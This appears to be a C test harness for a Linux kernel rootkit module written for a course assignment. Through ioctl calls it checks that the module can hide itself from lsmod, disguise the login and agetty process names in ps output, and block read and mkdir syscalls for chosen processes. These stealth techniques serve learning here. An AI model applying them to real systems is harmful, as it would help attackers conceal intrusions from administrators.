#include "shared_rootkit.h"
#include <fcntl.h>
#include <linux/sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <unistd.h>

const char *device = "/dev/rootkit";
const char *proc_name = "rootkit_test";
const char *test_file = "/mnt/ssdi-hw1/test.txt";
const char *child_proc_name = "rootkit_test_ch";
const char *child_exec = "/mnt/ssdi-hw1/rootkit_test_child";
const char *test_dir_name = "/home/hello";

void test_hide() {
  int fd = open(device, O_RDWR);
  if (fd < 0) {
    perror("open");
    return;
  }

  int ret = ioctl(fd, IOCTL_MOD_HIDE, 0);
  if (ret < 0) {
    perror("ioctl");
    return;
  }

  // checking lsmod output

  printf("first call should hide module...\n");
  system("lsmod");

  ret = ioctl(fd, IOCTL_MOD_HIDE, 0);
  if (ret < 0) {
    perror("ioctl");
    return;
  }

  // checking lsmod output
  printf("second call should unhide module...\n");
  system("lsmod");

  close(fd);
}

void test_masq() {
  int fd = open(device, O_RDWR);
  struct masq_proc_req req;
  req.len = 2;
  req.list = malloc(req.len * sizeof(struct masq_proc));
  strncpy(req.list[0].orig_name, "login", MASQ_LEN);
  strncpy(req.list[0].new_name, "felw", MASQ_LEN);
  strncpy(req.list[1].orig_name, "agetty", MASQ_LEN);
  strncpy(req.list[1].new_name, "shax", MASQ_LEN);

  printf("* masquerading login and agetty processes... before\n");
  system("ps ao pid,comm");

  int ret = ioctl(fd, IOCTL_MOD_MASQ, &req);
  if (ret < 0) {
    perror("ioctl");
    return;
  }

  printf("* call should masquerade processes...\n");
  system("ps ao pid,comm");

  free(req.list);
  close(fd);
}

void test_filter() { // testing filter of read() and mkdir()
  char buf[2];
  int fd = open(device, O_RDWR);
  int file_fd = open(test_file, O_RDONLY);
  if (file_fd < 0) {
	perror("open fail");
	}
  struct filter_info info;

  info.syscall_nr = SYS_read;
  strncpy(info.comm, proc_name, TASK_FILTER_LEN);
  info.comm[TASK_FILTER_LEN - 1] = '\0';

  printf("* IOCTL_ADD_FILTER: adding filter for read & mkdir syscall...\n");
  if (read(file_fd, buf, 2) == 2) {
    buf[1] = '\0';
    printf("read() succeeded with content %s\n", buf);
  } else {
    perror("read() failed without filter");
  }

  if (mkdir(test_dir_name, 0777) == 0) {
    printf("mkdir() succeeded, removing newly created dir %s\n", test_dir_name);
    rmdir(test_dir_name);
  } else {
    perror("mkdir() failed without filter");
  }

  int ret = ioctl(fd, IOCTL_ADD_FILTER, &info);
  if (ret < 0) {
    perror("read ioctl");
    return;
  }




  info.syscall_nr = SYS_mkdirat;
  ret = ioctl(fd, IOCTL_ADD_FILTER, &info);
  if (ret < 0) {
    perror("mkdir ioctl");
    return;
  }

  printf("* read syscall should be filtered...\n");
  lseek(file_fd, 0, SEEK_SET);
  int n = read(file_fd, buf, 2);
  printf("read() returned %d\n", n);
  if (n < 0) {
    printf("read() failed with status code\n");
  } else {
    perror("read() succeeded with content");
  }

  printf("* mkdir syscall should be filtered...\n");
  if (mkdir(test_dir_name, 0777) == 0) {
    perror("mkdir() succeeded\n");
  } else {
    printf("mkdir() failed with filter\n");
  }

  printf("* IOCTL_REMOVE_FILTER: removing filter for mkdir...\n");
  ret = ioctl(fd, IOCTL_REMOVE_FILTER, &info);
  if (ret < 0) {
    perror("ioctl");
    return;
  }

  printf("* mkdir syscall should not be filtered...\n");
  if (mkdir(test_dir_name, 0777) == 0) {
    printf("mkdir() succeeded, removing newly created dir %s\n", test_dir_name);
    rmdir(test_dir_name);
  } else {
    perror("mkdir() failed without filter");
  }


  printf("* filtering mkdir for child process\n");
  strncpy(info.comm, child_proc_name, TASK_FILTER_LEN);
  ret = ioctl(fd, IOCTL_ADD_FILTER, &info);
  if (ret < 0){
    perror("ioctl");
  }

  close(fd);
  close(file_fd);

  printf("* creating child process to test filter do not block other processes "
         "on read()...\n");
  // execve child process to test filter
  pid_t pid = fork();
  if (pid == 0) {
    printf("* executing child process...\n");
    execve(child_exec, NULL, NULL);
    perror("execl");
    exit(1);
  } else if (pid < 0) {
    perror("fork");
    return;
  }
}

int main() {
  printf("Testing IOCTL_MOD_HIDE\n=====================\n");
  test_hide();

  printf("\nTesting IOCTL_MOD_MASQ\n=====================\n");
  test_masq();

  printf("\nTesting "
         "IOCTL_ADD_FILTER/IOCTL_REMOVE_FILTER\n=====================\n");
  test_filter();
}
